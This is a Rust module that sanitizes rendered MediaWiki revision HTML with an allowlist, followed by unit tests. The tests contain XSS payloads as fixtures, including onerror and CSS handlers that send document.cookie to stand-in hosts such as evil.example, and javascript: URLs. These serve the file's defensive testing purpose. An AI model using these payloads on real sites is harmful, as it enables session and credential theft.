//! Allowlist sanitizer for rendered wiki-revision HTML (ADR-0032).
//!
//! # Why this exists
//!
//! The rendered-hunk-preview surface takes the HTML that `MediaWiki`'s
//! `action=parse` produces for an **arbitrary revision** — i.e. content authored
//! by whoever made that edit — and the browser shell renders it with
//! `set_inner_html` (`sp42-app`'s `RenderedHtmlPane`). Without sanitization the
//! operator's browser executes whatever that markup implies, in a surface that
//! holds a live Wikimedia bearer token.
//!
//! The Constitution (Art. 10.2) states "Diff rendering uses sanitized allowlist".
//! Until this module, no sanitizer existed anywhere in the workspace; this file
//! makes the claim true.
//!
//! # Why the server owns it
//!
//! Sanitization runs at the **fetch edge**, not in the view, for two reasons:
//!
//! 1. Every consumer is covered. The same `RenderedHunkSide` is served to the
//!    browser, the CLI and the MCP surface; sanitizing once at the edge means
//!    none of them can be handed untrusted markup by a future caller.
//! 2. It keeps `html5ever` out of the browser bundle. `sp42-platform` is in the
//!    wasm chain (`sp42-app` -> `sp42-core` -> `sp42-platform`), so a
//!    sanitizer there would add an HTML parser to the wasm bundle and breach the
//!    Art. 5.2 size ceiling. The server is native-only.
//!
//! # Policy
//!
//! Allowlist-only, and the allowlist is deliberately narrow:
//!
//! - **Structure and formatting** survive, so a diff still reads as prose.
//! - **`style` attributes and `<style>` elements are dropped entirely.** Inline
//!   CSS is a data-exfiltration channel (`background:url(//attacker/…)`) and a
//!   UI-redress channel; the diff view is a review surface, not a layout engine.
//! - **URL schemes are restricted to http/https**, and `rel="noopener
//!   noreferrer"` is forced on every surviving link so a clicked reference
//!   cannot reach back into the app.
//! - **`MathML` is preserved**, because Wikipedia renders formulas as `MathML` and
//!   dropping it would silently corrupt the diff of most science articles.
//! - **Comments are dropped** (they can carry conditional-comment payloads).

use std::collections::{HashMap, HashSet};

use ammonia::{Builder, UrlRelative};

/// Sanitize rendered wiki-revision HTML for display in a review surface.
///
/// This is total: any input, including malformed markup, `utf8`-invalid markup,
/// or a payload, produces markup that is safe to hand to `innerHTML`. Markup is
/// re-serialized from an HTML5 parse, so unbalanced or mis-nested input is
/// normalized rather than passed through.
///
/// # Examples
///
/// Script elements and their contents are removed, not just their tags:
///
/// ```
/// use sp42_fetch::sanitize_rendered_html;
///
/// let clean = sanitize_rendered_html(r"<p>ok</p><script>alert(1)</script>");
/// assert_eq!(clean, "<p>ok</p>");
/// ```
///
/// Inline event handlers are stripped while the element keeps its content:
///
/// ```
/// use sp42_fetch::sanitize_rendered_html;
///
/// let clean = sanitize_rendered_html(r#"<p onclick="steal()">text</p>"#);
/// assert_eq!(clean, "<p>text</p>");
/// ```
#[must_use]
pub fn sanitize_rendered_html(input: &str) -> String {
    sanitize_with_limits(input, DEFAULT_MAX_BYTES)
}

/// Cap on the sanitized output, mirroring the fetch edge's response-size cap
/// (ADR-0015). The sanitizer's own cost is linear in input, so an unbounded
/// hostile revision is a CPU/DoS concern on the server; this bounds it.
///
/// The cap is applied to the *sanitized* output, and truncation is
/// tag-structure-aware: the cut is rolled back to the last point at which the
/// document was not inside an element, so the result is always well-formed
/// rather than a fragment that closes tags the sanitizer would emit.
pub const DEFAULT_MAX_BYTES: usize = 4 * 1024 * 1024;

/// Sanitize and bound the output size.
///
/// # Examples
///
/// ```
/// use sp42_fetch::sanitize_rendered_html;
///
/// // Oversized input is truncated, and the result is still well-formed.
/// let clean = sanitize_rendered_html(&"x".repeat(64));
/// assert_eq!(clean, "x".repeat(64));
/// ```
#[must_use]
pub fn sanitize_with_limits(input: &str, max_bytes: usize) -> String {
    let cleaned = builder().clean(input).to_string();
    if cleaned.len() <= max_bytes {
        return cleaned;
    }
    truncate_to_tag_boundary(&cleaned, max_bytes)
}

/// Cut `cleaned` to at most `max_bytes`, backing off to the last position where
/// the document is not inside an open element so the result stays well-formed.
fn truncate_to_tag_boundary(cleaned: &str, max_bytes: usize) -> String {
    let mut cut = floor_to_char_boundary(cleaned, max_bytes.min(cleaned.len()));
    // Do not end inside an element or an attribute value: roll back to before
    // the last `<` that has no matching `>` after it.
    let head = &cleaned[..cut];
    if let Some(open) = head.rfind('<')
        && !head[open..].contains('>')
    {
        cut = floor_to_char_boundary(cleaned, open);
    }
    cleaned[..cut].to_string()
}

/// Largest index `<= index` that does not split a `UTF-8` code point.
fn floor_to_char_boundary(text: &str, mut index: usize) -> usize {
    while index > 0 && !text.is_char_boundary(index) {
        index -= 1;
    }
    index
}

/// Tags preserved by the allowlist.
///
/// Grouped by the role they play in a diff, so a future change to the policy is
/// a deliberate edit to a named group rather than an ad-hoc addition.
const ALLOWED_TAGS: &[&str] = &[
    // flow & structure
    "p",
    "br",
    "hr",
    "div",
    "span",
    "section",
    "figure",
    "figcaption", //
    // headings
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6", //
    // grouping
    "blockquote",
    "pre",
    "code",
    "kbd",
    "samp",
    "var", //
    // lists
    "ul",
    "ol",
    "li",
    "dl",
    "dt",
    "dd", //
    // tables
    "table",
    "thead",
    "tbody",
    "tfoot",
    "tr",
    "td",
    "th",
    "caption",
    "colgroup",
    "col", //
    // inline text semantics
    "b",
    "i",
    "u",
    "s",
    "em",
    "strong",
    "mark",
    "small",
    "sub",
    "sup",
    "abbr",
    "cite",
    "q",
    "time",
    "del",
    "ins",
    "ruby",
    "rt",
    "rp",
    "bdi",
    "bdo",
    "wbr", //
    // links & media
    "a",
    "img", //
    // MathML — Wikipedia renders formulas this way
    "math",
    "semantics",
    "mrow",
    "mi",
    "mn",
    "mo",
    "msub",
    "msup",
    "msubsup",
    "mfrac",
    "msqrt",
    "mroot",
    "munder",
    "mover",
    "munderover",
    "mtext",
    "mspace",
    "mtable",
    "mtr",
    "mtd",
    "mstyle",
    "merror",
    "mpadded",
    "mphantom",
    "menclose",
    "maction",
    "mmultiscripts",
    "mprescripts",
    "none",
    "annotation",
];

/// Attributes preserved on every allowed tag.
const GENERIC_ATTRIBUTES: &[&str] = &[
    "class", "id", "title", "dir", "lang",
    // `data-mw` carries the structured editor payload that the
    // reference-extraction lane reads back. It is inert in a browser.
    "data-mw", // Inert accessibility metadata the wiki's own templates emit.
    "role",
];

/// Attributes preserved only on specific tags.
///
/// `a` deliberately omits `rel`: [`ALLOWED_LINK_REL`] owns it, and ammonia
/// asserts the two are not both configured, so author-supplied `rel` is replaced.
const PER_TAG_ATTRIBUTES: &[(&str, &[&str])] = &[
    ("a", &["href", "name"]),
    // `srcset` is present because MediaWiki emits responsive candidate sets.
    // A surviving `img` still makes the browser contact whatever host the
    // revision names; that is inherent to rendering a diff and is recorded as
    // an accepted risk in ADR-0032 rather than fixed by dropping images.
    ("img", &["src", "srcset", "alt", "width", "height"]),
    ("td", &["colspan", "rowspan"]),
    ("th", &["colspan", "rowspan", "scope"]),
    ("ol", &["start", "type"]),
    ("li", &["value"]),
    ("col", &["span"]),
    (
        "table",
        &[
            "border",
            "cellpadding",
            "cellspacing",
            "summary",
            "width",
            "align",
            "valign",
        ],
    ),
];

/// Forced onto every surviving link so a clicked reference cannot script or
/// navigate the reviewing operator's app.
const ALLOWED_LINK_REL: &str = "noopener noreferrer";

/// URL schemes an attribute value may use. Everything else — notably
/// `javascript:`, `data:` and `vbscript:` — is dropped with the attribute.
const ALLOWED_URL_SCHEMES: &[&str] = &["http", "https"];

/// Build the sanitizer. Kept separate so the policy is readable in one place and
/// testable, and so a future ADR can widen it deliberately rather than by drift.
fn builder() -> Builder<'static> {
    let mut builder = Builder::default();

    builder.tags(ALLOWED_TAGS.iter().copied().collect::<HashSet<&str>>());
    builder.generic_attributes(
        GENERIC_ATTRIBUTES
            .iter()
            .copied()
            .collect::<HashSet<&str>>(),
    );
    builder.tag_attributes(
        PER_TAG_ATTRIBUTES
            .iter()
            .map(|(tag, attrs)| ((*tag), attrs.iter().copied().collect::<HashSet<&str>>()))
            .collect::<HashMap<&str, HashSet<&str>>>(),
    );

    // MediaWiki emits relative links for internal targets (`/wiki/Foo`); those
    // are legitimate and stay, but only http/https survive as absolute schemes.
    builder.url_relative(UrlRelative::PassThrough);
    builder.url_schemes(
        ALLOWED_URL_SCHEMES
            .iter()
            .copied()
            .collect::<HashSet<&str>>(),
    );
    builder.link_rel(Some(ALLOWED_LINK_REL));

    builder
}

/// Attribute ammonia would otherwise keep on any tag, which the policy
/// deliberately does not want. Exposed for the regression test that asserts the
/// absence of `style` and event handlers.
#[cfg(test)]
const NEVER_ALLOWED: &[&str] = &["style", "onerror", "onclick", "onload", "onmouseover"];

#[cfg(test)]
mod tests {
    use super::NEVER_ALLOWED;
    use crate::sanitize_rendered_html;

    #[test]
    fn removes_script_elements_and_their_contents() {
        let clean = sanitize_rendered_html(
            r"<p>before</p><script>window.__stolen = document.cookie;</script><p>after</p>",
        );
        assert_eq!(clean, "<p>before</p><p>after</p>");
        assert!(!clean.contains("script"), "{clean}");
        assert!(!clean.contains("__stolen"), "{clean}");
    }

    #[test]
    fn removes_stripped_tags_but_keeps_their_text() {
        // `<style>` content is dropped with the element, not hoisted into text.
        let clean = sanitize_rendered_html(r"<style>body{display:none}</style><p>kept</p>");
        assert_eq!(clean, "<p>kept</p>");
    }

    #[test]
    fn strips_inline_event_handlers() {
        for payload in [
            r#"<img src=x onerror="fetch('//evil/'+document.cookie)">"#,
            r#"<p onmouseover="alert(1)">hover</p>"#,
            r"<div onload=alert(1)>x</div>",
            r#"<body onload="alert(1)">x</body>"#,
        ] {
            let clean = sanitize_rendered_html(payload);
            for forbidden in NEVER_ALLOWED {
                assert!(
                    !clean.to_ascii_lowercase().contains(forbidden),
                    "{forbidden} survived in {clean}"
                );
            }
        }
    }

    #[test]
    fn strips_style_attribute_so_css_cannot_exfiltrate() {
        let clean = sanitize_rendered_html(
            r#"<p style="background:url('https://evil.example/steal?c='+document.cookie)">x</p>"#,
        );
        assert!(!clean.contains("style"), "{clean}");
        assert!(!clean.contains("evil.example"), "{clean}");
    }

    #[test]
    fn drops_dangerous_url_schemes_but_keeps_http_and_relative_links() {
        for blocked in [
            r#"<a href="javascript:alert(1)">x</a>"#,
            r#"<a href="data:text/html,<script>alert(1)</script>">x</a>"#,
            r#"<a href="vbscript:msgbox(1)">x</a>"#,
        ] {
            let clean = sanitize_rendered_html(blocked);
            let lower = clean.to_ascii_lowercase();
            assert!(!lower.contains("javascript:"), "{clean}");
            assert!(!lower.contains("vbscript:"), "{clean}");
            assert!(!lower.contains("data:text/html"), "{clean}");
        }

        // Legitimate reference targets survive.
        for kept in [
            r#"<a href="https://doi.org/10.1000/182">doi</a>"#,
            r#"<a href="/wiki/Frankenstein">internal</a>"#,
        ] {
            let clean = sanitize_rendered_html(kept);
            assert!(clean.contains("href="), "{clean}");
        }
    }

    #[test]
    fn forces_rel_on_surviving_links() {
        let clean = sanitize_rendered_html(r#"<a href="https://example.org/">x</a>"#);
        assert!(clean.contains("noopener"), "{clean}");
        assert!(clean.contains("noreferrer"), "{clean}");
    }

    #[test]
    fn neutralizes_iframe_object_and_embed() {
        for payload in [
            r#"<iframe src="https://evil.example/"></iframe>"#,
            r#"<object data="https://evil.example/x.swf"></object>"#,
            r#"<embed src="https://evil.example/x.swf">"#,
            r#"<form action="https://evil.example/steal"><input name="pw"></form>"#,
            r#"<base href="https://evil.example/">"#,
            r#"<meta http-equiv="refresh" content="0;url=https://evil.example/">"#,
            r#"<link rel="import" href="https://evil.example/x.html">"#,
        ] {
            let clean = sanitize_rendered_html(payload).to_ascii_lowercase();
            for forbidden in [
                "iframe", "<object", "<embed", "<form", "<base", "<meta", "<link",
            ] {
                assert!(!clean.contains(forbidden), "{forbidden} survived: {clean}");
            }
        }
    }

    #[test]
    fn preserves_mathml_so_formula_diffs_stay_readable() {
        let clean = sanitize_rendered_html(
            r#"<math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>e</mi><mn>2</mn></msup></math>"#,
        );
        assert!(clean.contains("<math"), "{clean}");
        assert!(clean.contains("<msup"), "{clean}");
        assert!(clean.contains("<mi>"), "{clean}");
    }

    #[test]
    fn preserves_readable_structure_and_data_mw_payload() {
        let clean = sanitize_rendered_html(
            r#"<h2>History</h2><ul><li><a href="/wiki/X">X</a></li></ul><table><tr><td colspan="2">c</td></tr></table><span data-mw='{"a":1}'>s</span>"#,
        );
        assert!(clean.contains("<h2>"), "{clean}");
        assert!(clean.contains("<li>"), "{clean}");
        assert!(clean.contains("colspan=\"2\""), "{clean}");
        assert!(clean.contains("data-mw"), "{clean}");
    }

    #[test]
    fn is_total_on_hostile_and_malformed_input() {
        // Must not panic, and must not emit executable markup.
        for payload in [
            "",
            "<",
            "<<<<>>>>",
            "<p><div><span>unclosed",
            &"<b>".repeat(2_000),
            "<p>\u{0}\u{feff}text</p>",
            "<p title='\"'>quote</p>",
            "<!--[if IE]><script>alert(1)</script><![endif]-->",
        ] {
            let clean = sanitize_rendered_html(payload);
            let lower = clean.to_ascii_lowercase();
            assert!(!lower.contains("<script"), "{clean}");
            assert!(!lower.contains("javascript:"), "{clean}");
        }
    }

    #[test]
    fn truncation_keeps_output_well_formed() {
        // A large hostile document is cut without leaving a dangling tag.
        let payload = "<p>".repeat(2_000) + &"y".repeat(50_000);
        let clean = super::sanitize_with_limits(&payload, 512);
        assert!(clean.len() <= 512, "{}", clean.len());
        // Re-sanitizing the truncated output must be a fixed point: proof that
        // no tag was left open.
        assert_eq!(super::sanitize_with_limits(&clean, 512), clean);
    }

    #[test]
    fn truncation_respects_multibyte_boundaries() {
        let payload = "<p>é</p>".repeat(500);
        let clean = super::sanitize_with_limits(&payload, 101);
        assert!(clean.len() <= 101);
        assert_eq!(super::sanitize_with_limits(&clean, 101), clean);
    }

    #[test]
    fn default_entry_point_bounds_hostile_input() {
        // A revision far past the cap is still bounded and still safe.
        let payload = format!("<p>{}</p>", "z".repeat(super::DEFAULT_MAX_BYTES + 1_024));
        let clean = super::sanitize_rendered_html(&payload);
        assert!(clean.len() <= super::DEFAULT_MAX_BYTES);
        assert!(!clean.contains("<script"));
    }

    #[test]
    fn output_is_stable_under_repeated_sanitization() {
        // Idempotence: sanitizing already-clean output must be a no-op, so the
        // server-side sanitize and any future client-side defense compose.
        let once = sanitize_rendered_html(
            r#"<p style="color:red">t</p><script>x</script><a href="javascript:1">l</a>"#,
        );
        assert_eq!(sanitize_rendered_html(&once), once);
    }
}
